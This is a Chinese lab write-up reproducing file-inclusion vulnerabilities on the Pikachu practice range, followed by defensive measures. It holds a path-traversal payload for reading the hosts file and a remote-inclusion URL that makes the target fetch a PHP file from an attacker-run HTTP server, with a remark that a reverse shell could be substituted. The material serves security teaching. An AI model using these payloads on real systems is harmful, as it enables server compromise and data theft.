#  靶机复现-pikachu靶场文件包含漏洞   
 泷羽SEC-ohh   2025-01-21 07:28  
  
>   
> 本篇文章旨在为网络安全渗透测试靶机复现学习。通过阅读本文，读者将能够对渗透pikachu靶场文件包含漏洞复现有一定的了解  
  
##### 原文学习链接  
  
CSDN博主：  
One_Blanks  
##### 靶机资源下载  
  
phpstudy  
pikachu  
## 一、前言   
  
文件包含漏洞是编程中的一种安全隐患，常见于PHP等语言。它源于程序运行时依据用户输入或外部数据动态包含文件的机制，当对输入路径缺乏足够验证和过滤时，攻击者可构造恶意路径。这一漏洞危害巨大，既能实现代码执行，让攻击者在目标服务器植入恶意程序、控制服务器，又能导致敏感信息泄露，像数据库和用户认证信息等外流。防范方面，要对包含文件的输入严格验证过滤，采用白名单等方式确保文件来源合法；在服务器端（如PHP里）关闭远程文件包含功能；同时遵循最小权限原则，限制运行Web应用的用户的权限，从而降低被攻击后的损害程度。  
## 二、本地文件包含   
### 1、 burp抓包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wul7icMxhHHDRKiaEPmHY5vNC8tMDQ8t65icjyYfhT78mexxrSEIxibcHRTsdhTeAibpxgt1fohLMD5fUniaicSxPnXqw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wul7icMxhHHDRKiaEPmHY5vNC8tMDQ8t65cASKfVexeuez5pmgSGptVjicLjwovNI9MTH8g3RiasDEMPrpIBQRUe1A/640?wx_fmt=png&from=appmsg "")  
### 2、burp修改参数：替换文件路径  
```
..\..\..\..\..\..\windows\system32\drivers\etc\hosts

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wul7icMxhHHDRKiaEPmHY5vNC8tMDQ8t65XHWoa8nicFHicrkGEectYb7KM7CYqqROdicQmvnjcQpOtYryCtzftCShQ/640?wx_fmt=png&from=appmsg "")  
## 三、远程文件包含   
### 1、攻击机开启http微服务，创建一句话木马  
```
<?php phpinfo();?>   #读取phpinfo 也可以写其他反向shell
python -m http.server 8008   #当前目录开启http服务 端口8008

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wul7icMxhHHDRKiaEPmHY5vNC8tMDQ8t65Grjic31GkBg9bumf91aPhbpiaoYBVFhvAmJtf3FicKAbK7FUQB0RHIG4A/640?wx_fmt=png&from=appmsg "")  
### 2、burp修改数据包，将文件改为kali的一句话php  
```
http://192.168.60.128:8008/webshell.php

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wul7icMxhHHDRKiaEPmHY5vNC8tMDQ8t65mV0W7Da4htBhy0AhvwviaK3GHsqvzK0Jnsl7zCwA4xCbhTkZHiaKa9SQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wul7icMxhHHDRKiaEPmHY5vNC8tMDQ8t65fk0WDKIS7zIr00TITjBhjjbfoUJelysPD56judgIQGUVNEzq9PgykA/640?wx_fmt=png&from=appmsg "")  
## 四、防范措施   
### 1、输入验证与过滤  
  
严格限制输入来源：对于任何可能用于文件包含的用户输入或外部数据，要明确其来源范围。例如，在Web应用中，如果是通过表单提交的文件名，只允许特定的字符集，如字母、数字和下划线，并且限制长度。  
### 2、白名单验证  
  
白名单验证：建立一个合法文件的“白名单”。当需要包含文件时，检查要包含的文件名是否在白名单内。比如，在一个特定的模块中，只允许包含预先定义好的几个配置文件或函数库文件。  
### 3、关闭远程文件包含  
  
在PHP中，将allow_url_include设置为Off（可在php.ini文件中进行设置）。这样可以防止攻击者通过URL来包含远程恶意脚本。  
### 4、限制包含路径  
  
设定安全的包含路径范围。例如，在应用程序中，只允许包含特定目录及其子目录下的文件，避免用户能够访问到系统关键目录或其他不相关的敏感区域。  
  
  
